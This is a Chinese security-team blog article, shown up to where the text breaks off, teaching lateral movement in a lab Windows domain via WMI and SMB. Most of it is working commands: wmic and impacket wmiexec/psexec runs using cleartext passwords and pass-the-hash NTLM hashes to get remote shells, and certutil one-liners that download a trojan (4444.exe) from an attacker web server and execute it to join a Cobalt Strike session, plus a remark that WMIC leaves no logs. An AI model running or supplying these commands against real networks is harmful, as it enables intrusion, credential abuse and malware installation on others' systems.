---
title: 横向移动-WMI、SMB
url: https://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247507329&idx=1&sn=8f65a152de3d0daa05a8f712c46230db&chksm=ce5dffe0f92a76f66559dbb9485a08f0fd12633df62855eac50a1fe57facb16a88b7e47cc1f3&scene=58&subscene=0#rd
source: Tide安全团队
date: 2023-02-11
fetch_date: 2025-10-04T06:21:16.612974
---

# 横向移动-WMI、SMB

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RVvvWMZwzOmMrYGPNk1gic0OpelXW3wHqCOaWpEicqXXk6X44ggWYWCOCSM2zbXFI6zPlXicyQNVgg1w/0?wx_fmt=jpeg)

# 横向移动-WMI、SMB

原创

0h1inge

Tide安全团队

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVEB0NZ87EFzNM4866ybBQMVhN8RQR8c6zEaACxatlch2rgdzYzYAiahr1GUq1cLMMGVnvKpF8biaWA/640?wx_fmt=png)

## WMI

### 什么是WMI？

WMI是通过135端口进行利用，支持用户名明文或hash的方式进行认证，在使用WMIC执行命令过程中，操作系统默认不会将WMIC的操作记录在日志中，因此在利用过程中不会产生日志。所以越来越多的攻击者开始渐渐使用WMI进行攻击。

WMI的利用条件

1. 1. 获得目标机器的用户名和密码
2. 2. 开放139、445端口

WMIC的使用需要对方开启135端口（有的工具需要445端口）和admin$共享，135端口是WMI默认的管理端口

### WMI利用手法

WMI演示环境如下图：

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVvvWMZwzOmMrYGPNk1gic0OohQ3wJibD4ncnHJibZDwSB2SaEfQDMLWHUrlbWo2298a8Q8vV5Y4QpoA/640?wx_fmt=png "null")

#### WMIC

系统自带的WMIC命令是单执行，无回显的，并且只支持明文密码，不支持hash进行传递 在这里，我们对SQLserver执行了一个ipconfig的命令，并将结果保存在C盘的ip.txt文件中：

```
wmic /node:192.168.3.32 /user:administrator /password:admin!@#45 process call create "cmd.exe /c ipconfig > c:\ip.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVvvWMZwzOmMrYGPNk1gic0OTbOhrwR6HOUGYzgaMeM1HLC9NpdNxaqtLpK4lTIKvicH5AFBRVWgGicw/640?wx_fmt=png "null")

可以看到我们并无法直接看到命令的回显，但我们上帝视角切到靶机发现确实是执行命令了的 。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVvvWMZwzOmMrYGPNk1gic0O5ehCyxdc2eVGpEYq8Tqz7cY69ILY2AgJIImmaQHBmo8pjMbml0HNkA/640?wx_fmt=png "null")

这里如果在实战中，如果想要查看文件内容和文件是否上传成功的话，就要使用上篇文章内网移动-IPC中的type和dir命令

```
dir \\192.168.3.32\c$ #列出该主机的C盘下的文件
type \\192.168.3.32\c$\ip.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVvvWMZwzOmMrYGPNk1gic0O1d9cLicjaqakzmcxgRBpZAiaKn9vxcicicOpKutFrPDHEaG9t8ib95aC8cA/640?wx_fmt=png "null")![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVvvWMZwzOmMrYGPNk1gic0Oof42RmD7fyJfZhGk6KiaaUegKiaapUGQadPrYVbVlWUh7viayT5qUiaJFQ/640?wx_fmt=png "null")

这里将其上线CS的步骤也是：使用下载命令让其下载Web Server中的木马，执行上线

```
wmic /node:192.168.3.32 /user:administrator /password:admin!@#45 process call create "cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/4444.exe c:/4444.exe"  #下载Webserver中的木马文件到自己的C盘
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVvvWMZwzOmMrYGPNk1gic0OsCkv1QGLnRhVe1J2vf3lg8jpRsfeS3GBZaNZtxOLibIFMRXibHQfF2mA/640?wx_fmt=png "null")

```
wmic /node:192.168.3.32 /user:administrator /password:admin!@#45 process call create "cmd.exe /c c:/4444.exe" # 执行木马
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVvvWMZwzOmMrYGPNk1gic0OvNichRFoWCAG0Izl6Q2BsKoqljiaGewxgyRaKibekktZBI2nibWC49tnrQ/640?wx_fmt=png "null")

可以看到此时sqlserver成功被上线。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVvvWMZwzOmMrYGPNk1gic0OWFlIFVVg26ZVhHicNAxRdXUXo2nRwHzn33qKo3vpS6icEJg6eVlGIwzQ/640?wx_fmt=png "null")

#### wmiexec.vbs

wmiexec.vbs 脚本通过 VBS 调用 WMI 来模拟 PsExec 的功能，wmiexec.vbs 下载地址：https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs，交互式，适合在反弹shell或msfconsole中使用，不适合CS控制 首先我们将其上传到跳板机中，然后再使用命令去连接，由于CS无法返回shell的问题，所以该脚本并不适用于在CS中运行，所以这里我选择将会话转移到MSF中去运行。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVvvWMZwzOmMrYGPNk1gic0OcecJzDhYfFsv1VCOnCqSvwOkGXl0LxLXoRVpx1TMow9TIJ4kF1aOpw/640?wx_fmt=png "null")

```
cscript //nologo wmiexec.vbs /shell 192.168.3.32 administrator admin!@#45
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVvvWMZwzOmMrYGPNk1gic0OkoQvA2gs9YajGzHDqQviaLPFAQrARlLrHugI5zjpcKHefUHblr2QklA/640?wx_fmt=png "null")

可以看到在MSF中运行了该文件后，成功将sqlserver的shell反弹了过来，在此我们可以直接让其下载后门并执行，上线到我们的CS中。

```
cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/4444.exe c:/4444.exe & C:/4444.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVvvWMZwzOmMrYGPNk1gic0Ov4Wxs45SibDCMLicgBsibtdPnIVN1IQb4hZ6xAVwH2UIKSnHzaLfTibYvA/640?wx_fmt=png "null")

可以看到SQLserver成功上线CS

#### wmiexec-impacket

impacket套件中的wmiexec同样可对WMI进行横向移动，并且支持交互式与单执行，支持hash进行传递，相对来说更为方便，这里直接使用它的py脚本配合socket代理就可以对其内网进行横向移动，避免了上传文件等敏感操作。首先设置好Socket代理，与proxifier的代理与代理规则

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVvvWMZwzOmMrYGPNk1gic0OIJnFrzjMnHWicZQiaZSg5KsYS7qOAnhSXrjTdsG8A4QsibltGHNN16DBA/640?wx_fmt=png "null")![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVvvWMZwzOmMrYGPNk1gic0OLtQKFaYVXLURhYezyHlW7ZS5ReqlFgR9oq8wicRRUk9BElGfLN6nssA/640?wx_fmt=png "null")![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVvvWMZwzOmMrYGPNk1gic0O7sDwiafpF0l4SicUdvyKEeyTQh4mex3BHu8uCpz1mkvu2ygA55YNjECA/640?wx_fmt=png "null")

配置好socket代理与规则后，就可直接在本机中调用wmiexec.py文件对其内网进行wmi利用

```
python wmiexec.py ./administrator:Admin12345@192.168.3.21 # 通过明文密码连接获得目标本地用户交互式shell
python wmiexec.py god/administrator:Admin12345@192.168.3.21 # 通过明文密码连接获得目标域用户交互式shell
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVvvWMZwzOmMrYGPNk1gic0OwiaxLkiaIge0osOcexHAq6ft9oJnHKiaADsoDvOFHjb4Lxznm7N8OtZcw/640?wx_fmt=png "null")![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVvvWMZwzOmMrYGPNk1gic0OpS91siaaUR5iammUVKzSGx01RCOJOVZssgmSgGn3FlF0RocsOjtrtpow/640?wx_fmt=png "null")

通过该命令成功获得一个交互式的shell，那么wmiexec.py也可单执行命令。

```
python wmiexec.py ./administrator:admin!@#45@192.168.3.32 "whoami"  # 以明文密码连接本地用户并执行命令
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVvvWMZwzOmMrYGPNk1gic0OWmWAK5nVXagp94tVwr0NbuIqrFyOaUPRzLs7ibGy2L882vfnORdnrCQ/640?wx_fmt=png "null")

```
python wmiexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 "whoami" # 以hash密码连接本地用户并执行命令
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVvvWMZwzOmMrYGPNk1gic0OojumuydtfibxboJUd6z2UfryfLSRzcA7mQQ4RiaCzDMDCZBYAYxxaXlQ/640?wx_fmt=png "null")

这里将目标上线CS的方式和上面一致，通过命令下载木马并执行。

```
python wmiexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 "cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/4444.exe c:/4444.exe & C:/4444.exe"
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVvvWMZwzOmMrYGPNk1gic0OpCj4iciaRiaXc7GsUmj90l2hwWUnEDoDCYRH71rQqm6Dz6YYzqOgLcH1A/640?wx_fmt=png "null")

---

## SMB

### 什么是SMB？

SMB（Server Message Block）服务器信息块，它也是一种客户端到服务器的通信协议。除此之外，SMB协议也被称为请求-回复协议。客户端与服务器建立连接后，客户端可以向服务器发送SMB命令允许用户访问共享、打开、读取或者是写入文件

SMB的利用条件

1. 1. 利用SMB服务可以通过明文或hash传递来远程执行，条件445服务端口开放。
2. 2. 获得该目标的账号名与密码或hash

   ## SMB利用手法

   SMB演示环境如下图：

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVvvWMZwzOmMrYGPNk1gic0O0wOstnN63GAV6cSN5eEoMupJ6FKibGSewtbnDYwQTLLNu4LhiaUbG8kw/640?wx_fmt=png "null")

### PsExec

#### 官方Psexec

Psexec 是由 Mark Russinovich 创建的 Sysinternals Suite中包含的工具。最初，它旨在作为系统管理员的便利工具，以便他们可以通过在远程主机上运行命令来执行维护任务。后来因为太过方便，被利用到内网渗透之中。下载地址：https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools，但不支持hash传递，且CS无法利用，而且该工具好像只能在具有桌面权限后才可进行利用，我这里使用msf和反弹shell都无法成功反弹shell.... 这里将psexec.64上传到跳板机中

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVvvWMZwzOmMrYGPNk1gic0OKgrHNAXa19Hciapgibhpg1Gdic9HDALKJTabFP7rhKvNiaVIxJjP8pfkKg/640?wx_fmt=png "null")

然后在跳板机桌面中运行该工具，就会反弹出目标机器的shell，如下图所示。

```
psexec64.exe \\192.168.3.32 -u administrator -p admin!@#45 -s cmd
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVvvWMZwzOmMrYGPNk1gic0OehL7EmTbPmIibGXRSgfsNkZMjy44hhBHEicJ0ticBlY87TbyTotopkFNw/640?wx_fmt=png "null")

#### Impacket-PsExec

还有一个psexec就是我们的impacket套件中的工具，官方psexec有诸多限制，如不支持hash、cs、msf无法利用成功等问题，所以这里选择使用impacket中的psexec工具就相对来说比较灵活，同样，为了避免发送上传文件时数据丢失或被查杀等问题，我们可使用socket+psexec.py对其内网进行横向移动。socket配置此处不再描述，这里直接使用impacket-Psexec.py进行利用

```
psexec.py ./administrator:admin!@#45@192.168.3.32 # 通过明文密码连接获得目标本地用户交互式shell
psexec.py god/administrator:Admin12345@192.168.3.21 # 通过明文密码连接获得目标域用户交互式shell
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVvvWMZwzOmMrYGPNk1gic0OcBYlxUoxBzbjZSzK5C6ibia5ibNm7HVqCfib1L2dtjKAIs4iaDXTXmXoaLQ/640?wx_fmt=png "null")![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVvvWMZwzOmMrYGPNk1gic0OKrC0Gk0drWc9HhZzEzG01eKCqWBGblKKwhxkp7w0uN6QSUw0qjxFnA/640?wx_fmt=png "null")

```
python psexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 # 通过哈希密码连接获得目标本地用户交互式shell
python psexec.py -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21 # 通过哈希密码连接获得目标域用户交互式shell
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVvvWMZwzOmMrYGPNk1gic0OlWdhFq6HEOThlLPFvntvxVLxS1XsKSH892VV6CKSDIibbAiaibQfqUS2A/640?wx_fmt=png "null")![](https://mmbiz.qpic.cn/m...